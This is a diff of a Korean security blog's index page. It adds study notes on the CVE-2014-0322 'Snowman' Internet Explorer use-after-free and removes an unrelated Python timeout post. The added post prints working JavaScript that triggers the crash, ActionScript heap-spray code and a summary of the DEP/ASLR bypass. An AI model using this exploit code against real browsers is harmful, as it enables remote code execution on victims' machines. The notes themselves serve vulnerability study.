@@ -9,8 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="큰 소수 p 를 정한다. (e.g. 600 digits -> approx. 2000 bits) {1,&hellip;,p} 중에서 정수 하나를 고른다. g. Alice : choose random a in {1,&hellip;,p-1}
-send A = ga (mod p &hellip;">
+  <meta name="description" content="CVE-2014-0322 &lsquo;Snowman&rsquo; exploit crash 를 유발하는 JS. &lt;script&gt; function dword2data(dword) { var d = Number(dword).toString(16); while (d &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +65,159 @@ send A = ga (mod p &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/10/cve-2014-0322-snowman-exploit/">CVE-2014-0322 'Snowman' Exploit</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-10T01:12:08+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:12 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://hdwsec.fr/blog/CVE-2014-0322.html">CVE-2014-0322 &lsquo;Snowman&rsquo; exploit</a></p>
+
+<p>crash 를 유발하는 JS.</p>
+
+<pre><code>&lt;script&gt;
+    function dword2data(dword) {
+        var d = Number(dword).toString(16);
+        while (d.length &lt; 8)
+            d = '0' + d;
+        return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
+    }
+
+
+    var g_arr = [];
+    var arrLen = 0x250;
+
+    function fun() {
+
+        var a = 0;
+        for (a = 0; a &lt; arrLen; ++a) {
+            g_arr[a] = document.createElement('div')
+        }
+
+        var b = dword2data(0xdeadc0de);
+        var c = 0x1a1b2000;
+        while (b.length &lt; 0x360) {
+            b += dword2data(0x1a1b2000)
+        }
+
+        var d = b.substring(0, (0x340 - 2) / 2);
+        try {
+            this.outerHTML = this.outerHTML
+        } catch (e) {}
+
+        CollectGarbage();
+
+        for (a = 0; a &lt; arrLen; ++a) {
+            g_arr[a].title = d.substring(0, d.length);
+        }
+    }
+
+    function puIHa3() {
+        var a = document.getElementsByTagName("script");
+        var b = a[0];
+        b.onpropertychange = fun;
+        var e = document.createElement('SELECT');
+        e = b.appendChild(e);
+    }
+
+    puIHa3();
+&lt;/script&gt;
+</code></pre>
+
+<p>Flash 에서 heap 을 할당하고, initialize 하고, <code>ExternalInterface.call()</code> 로 JavaScript function 을 호출한다. JavaScript function 에서는 use-after-free 를 발생시킨다. Flash timer handler 에서 할당된 heap 을 모니터하며 corruption 이 발생했는지를 주기적으로 감시한다. corrupt condition 이 발견되면 VirtualProtect 와 stack pivot 정보를 찾아 DEP / ASLR 을 바이패스하는 payload 를 만들어 수행시킨다.</p>
+
+<h3>Heap Spraying</h3>
+
+<pre><code>&lt;Object&gt; 를 96 * 1024 (0x18180 == 98688) 개 할당한다.
+각각 s[0] ~ s[0x18180 - 1] 마다 Vector.&lt;uint&gt;(1024 - 16) 를 할당하고, 
+
+public function init_heap():void
+{
+    var len:int = 0;
+    var i:int = 0;
+
+    /* Spray the integer vectors */
+    this.s = new Vector.&lt;Object&gt;(0x18180);
+    whlie (len &lt; 0x18180)
+    {
+        this.s[len] = new Vector.&lt;uint&gt;(0x1000 / 4 - 16);
+        for (i = 0; i &lt; this.s[len].length; i++)
+        {
+            this.s[len][i] = 0x1a1a1a1a;
+        }
+        ++len;
+    }
+
+    /* Spray sound object ptr */
+    this.sound = new Sound();
+    this.spraysound = new Vector.&lt;Object&gt;(0x100);
+
+    len = 0;
+    while (len &lt; 0x100)
+    {
+        this.spraysound[len] = new Vector.&lt;Object&gt;(0x1234);
+        for (i = 0; i &lt; this.spraysound[len].length; i++)
+        {
+            this.spraysound[len][i] = this.sound;
+        }
+        ++len;
+    }
+}
+</code></pre>
+
+<h3>JavaScript use-after-free</h3>
+
+<h3>DEP bypass</h3>
+
+<pre><code>BOOL WINAPI VirtualProtect(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD flNewProtect,
+    PDWORD lpflOldProtect
+);
+
+BOOL WINAPI VirtualProtectEx(
+    HANDLE hProcess,
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD flNewProtect,
+    PDWORD lpflOldProtect
+);
+
+lpAddress [in]
+보호 특성을 변경할 가상 메모리의 기준 주소에 대한 포인터입니다.
+
+dwSize [in]
+변경할 메모리 페이지 영역의 크기(바이트)입니다.
+
+flNewProtect [in]
+적용할 메모리 보호 형식입니다.
+
+pflOldProtect [out]
+이전 메모리 보호 값에 대한 포인터입니다.
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -873,91 +1025,6 @@ else:
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/04/08/python-run-a-process-and-kill-it/">Python: Run a Process and Kill It</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-04-08T17:08:51+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>5:08 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://stackoverflow.com/questions/1359383/python-run-a-process-and-kill-it-if-it-doesnt-end-within-one-hour">Python: Run a process and kill it if it doesn&rsquo;t end within one hour</a></p>
-
-<p>프로세스 생성은 다음과 같이&hellip;</p>
-
-<pre><code>import subprocess
-subp = subprocess.Popen(['progname']
-</code></pre>
-
-<p>그리고 슬립 루프를 돌면서 타임아웃을 체크한다.</p>
-
-<pre><code>import psutil, time
-
-TIMEOUT = 60 * 60 # 1 hour
-
-p = psutil.Process(subp.pid)
-while 1:
-    if (time.time() - p.create_time) &gt; TIMEOUT:
-        p.kill()
-        raise RuntimeError('timeout')
-    time.sleep(5)
-</code></pre>
-
-<p>또는</p>
-
-<pre><code>import psutil
-
-p = psutil.Process(subp.pid)
-try
-    p.wait(timeout=60*60)
-except psutil.TimeoutExpired:
-    p.kill()
-    raise
-</code></pre>
-
-<p>또는</p>
-
-<pre><code>import subprocess
-proc = subprocess.Popen(['progname']
-</code></pre>
-
-<p>로 생성한 <code>proc</code> 을&hellip;</p>
-
-<pre><code>import time
-
-def wait_timeout(proc, seconds)
-    start = time.time()
-    end = start + seconds
-    interval = min(seconds / 1000.0, .25)
-
-    while True:
-        result = proc.poll()
-        if result is not None:
-            return result
-        if time.time() &gt;= end:
-            raise RuntimeError("Process timed out")
-        time.sleep(interval)
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/18">&larr; Older</a>
@@ -975,6 +1042,10 @@ def wait_timeout(proc, seconds)
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/17/cve-2016-0728/">CVE-2016-0728</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/14/the-poisoned-nul-byte/">The Poisoned NUL Byte</a>
       </li>
     
@@ -988,10 +1059,6 @@ def wait_timeout(proc, seconds)
     
       <li class="post">
         <a href="/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/">Glibc Adventures: The Forgotten Chunks</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/poison-null-byte/">Poison NULL Byte</a>
       </li>
     
   </ul>
